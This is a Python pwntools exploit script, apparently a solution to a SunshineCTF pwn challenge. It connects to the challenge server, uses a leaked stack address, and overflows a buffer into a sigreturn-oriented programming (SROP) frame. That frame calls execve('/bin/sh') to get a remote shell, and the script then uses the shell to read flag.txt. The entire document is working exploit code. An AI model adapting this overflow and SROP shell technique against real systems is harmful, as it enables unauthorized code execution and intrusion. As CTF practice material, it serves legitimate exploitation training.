from pwn import *
import time

context.arch = 'amd64'
io = remote('chal.sunshinectf.games', 26003)

# 1. Receive stack leak from Function 1 (0x401016)
leak = u64(io.recvn(8))
log.info(f"Leaked stack address: {hex(leak)}")

# 2. Satisfy Function 1's 0x18-byte read
io.send(b'A' * 0x18)
time.sleep(0.5)

syscall_ret = 0x401069
func2 = 0x40104f

# 3. Construct SROP frame calling execve('/bin/sh', 0, 0)
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = leak - 0x80  # Pointer to '/bin/sh' at start of buffer
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret
frame.rsp = leak

# 4. First read of Function 2: overflow stack to return to Function 2 again, then syscall; ret, then frame
payload = b'/bin/sh\x00'.ljust(0x80, b'\x00')
payload += p64(func2)
payload += p64(syscall_ret)
payload += bytes(frame)

io.send(payload)
time.sleep(0.5)

# 5. Second read of Function 2: send 15 bytes so read() returns 15 (SYS_rt_sigreturn) in RAX
io.send(b'B' * 15)
time.sleep(0.5)

# 6. Execute shell command to retrieve flag
io.sendline(b'/bin/cat flag.txt')
flag = io.recvall(timeout=3).decode(errors='replace').strip()
print(f"FLAG: {flag}")
